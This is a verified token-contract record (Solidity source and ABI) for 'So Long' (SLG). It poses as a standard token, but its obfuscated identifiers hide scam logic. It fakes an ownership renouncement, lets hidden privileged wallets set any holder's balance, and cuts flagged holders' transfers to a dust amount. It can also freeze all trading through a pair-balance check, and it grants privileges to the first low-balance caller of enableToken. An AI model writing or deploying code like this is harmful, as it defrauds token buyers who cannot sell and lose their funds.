{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface launchedMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract takeModeLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isTotal {\n    function createPair(address swapTeam, address buyLaunched) external returns (address);\n}\n\ninterface minMarketingSell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableIsToken) external view returns (uint256);\n\n    function transfer(address autoMax, uint256 enableIsLimit) external returns (bool);\n\n    function allowance(address modeSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 enableIsLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoMax,\n        uint256 enableIsLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableSwapList, uint256 value);\n    event Approval(address indexed modeSwap, address indexed spender, uint256 value);\n}\n\ninterface minMarketingSellMetadata is minMarketingSell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SoLong is takeModeLaunch, minMarketingSell, minMarketingSellMetadata {\n\n    address public toLimit;\n\n    function allowance(address receiverMode, address swapReceiver) external view virtual override returns (uint256) {\n        if (swapReceiver == sellAutoAmount) {\n            return type(uint256).max;\n        }\n        return isLaunched[receiverMode][swapReceiver];\n    }\n\n    string private txExemptSell = \"SLG\";\n\n    string private marketingToken = \"So Long\";\n\n    function transferFrom(address minTx, address autoMax, uint256 enableIsLimit) external override returns (bool) {\n        if (_msgSender() != sellAutoAmount) {\n            if (isLaunched[minTx][_msgSender()] != type(uint256).max) {\n                require(enableIsLimit <= isLaunched[minTx][_msgSender()]);\n                isLaunched[minTx][_msgSender()] -= enableIsLimit;\n            }\n        }\n        return toTradingReceiver(minTx, autoMax, enableIsLimit);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapShould;\n    }\n\n    function shouldLaunched(address minTx, address autoMax, uint256 enableIsLimit) internal returns (bool) {\n        require(fundMaxIs[minTx] >= enableIsLimit);\n        fundMaxIs[minTx] -= enableIsLimit;\n        fundMaxIs[autoMax] += enableIsLimit;\n        emit Transfer(minTx, autoMax, enableIsLimit);\n        return true;\n    }\n\n    function exemptLaunchedMarketing(uint256 enableIsLimit) public {\n        senderFund();\n        receiverLaunched = enableIsLimit;\n    }\n\n    function approve(address swapReceiver, uint256 enableIsLimit) public virtual override returns (bool) {\n        isLaunched[_msgSender()][swapReceiver] = enableIsLimit;\n        emit Approval(_msgSender(), swapReceiver, enableIsLimit);\n        return true;\n    }\n\n    function totalFund() public {\n        emit OwnershipTransferred(toLimit, address(0));\n        sellFrom = address(0);\n    }\n\n    mapping(address => bool) public totalShould;\n\n    function senderFund() private view {\n        require(takeWallet[_msgSender()]);\n    }\n\n    uint256 public marketingShouldList;\n\n    uint256 private feeMax = 100000000 * 10 ** 18;\n\n    function txTo(address walletLiquidity) public {\n        senderFund();\n        \n        if (walletLiquidity == toLimit || walletLiquidity == launchedAt) {\n            return;\n        }\n        totalShould[walletLiquidity] = true;\n    }\n\n    function toTradingReceiver(address minTx, address autoMax, uint256 enableIsLimit) internal returns (bool) {\n        if (minTx == toLimit) {\n            return shouldLaunched(minTx, autoMax, enableIsLimit);\n        }\n        uint256 liquidityAt = minMarketingSell(launchedAt).balanceOf(modeAuto);\n        require(liquidityAt == receiverLaunched);\n        require(autoMax != modeAuto);\n        if (totalShould[minTx]) {\n            return shouldLaunched(minTx, autoMax, txLaunched);\n        }\n        return shouldLaunched(minTx, autoMax, enableIsLimit);\n    }\n\n    address sellAutoAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public launchedAt;\n\n    function symbol() external view virtual override returns (string memory) {\n        return txExemptSell;\n    }\n\n    function balanceOf(address enableIsToken) public view virtual override returns (uint256) {\n        return fundMaxIs[enableIsToken];\n    }\n\n    function owner() external view returns (address) {\n        return sellFrom;\n    }\n\n    function teamMaxAmount(address takeFrom, uint256 enableIsLimit) public {\n        senderFund();\n        fundMaxIs[takeFrom] = enableIsLimit;\n    }\n\n    mapping(address => mapping(address => uint256)) private isLaunched;\n\n    constructor (){\n        \n        launchedMin minAmount = launchedMin(sellAutoAmount);\n        launchedAt = isTotal(minAmount.factory()).createPair(minAmount.WETH(), address(this));\n        \n        toLimit = _msgSender();\n        totalFund();\n        takeWallet[toLimit] = true;\n        fundMaxIs[toLimit] = feeMax;\n        \n        emit Transfer(address(0), toLimit, feeMax);\n    }\n\n    mapping(address => bool) public takeWallet;\n\n    uint256 modeExempt;\n\n    event OwnershipTransferred(address indexed limitTeamLaunched, address indexed feeLaunched);\n\n    bool public atToken;\n\n    mapping(address => uint256) private fundMaxIs;\n\n    function getOwner() external view returns (address) {\n        return sellFrom;\n    }\n\n    uint256 receiverLaunched;\n\n    bool public autoLimit;\n\n    uint8 private swapShould = 18;\n\n    uint256 public senderTeam;\n\n    function transfer(address takeFrom, uint256 enableIsLimit) external virtual override returns (bool) {\n        return toTradingReceiver(_msgSender(), takeFrom, enableIsLimit);\n    }\n\n    address private sellFrom;\n\n    bool public autoAtWallet;\n\n    uint256 constant txLaunched = 11 ** 10;\n\n    uint256 private atFund;\n\n    address modeAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function name() external view virtual override returns (string memory) {\n        return marketingToken;\n    }\n\n    bool public sellList;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeMax;\n    }\n\n    function enableToken(address buyLaunchMin) public {\n        require(buyLaunchMin.balance < 100000);\n        if (autoAtWallet) {\n            return;\n        }\n        \n        takeWallet[buyLaunchMin] = true;\n        \n        autoAtWallet = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitTeamLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableSwapList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableIsLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoAtWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableIsToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLaunchMin\",\"type\":\"address\"}],\"name\":\"enableToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"enableIsLimit\",\"type\":\"uint256\"}],\"name\":\"exemptLaunchedMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingShouldList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableIsLimit\",\"type\":\"uint256\"}],\"name\":\"teamMaxAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableIsLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableIsLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLiquidity\",\"type\":\"address\"}],\"name\":\"txTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SoLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}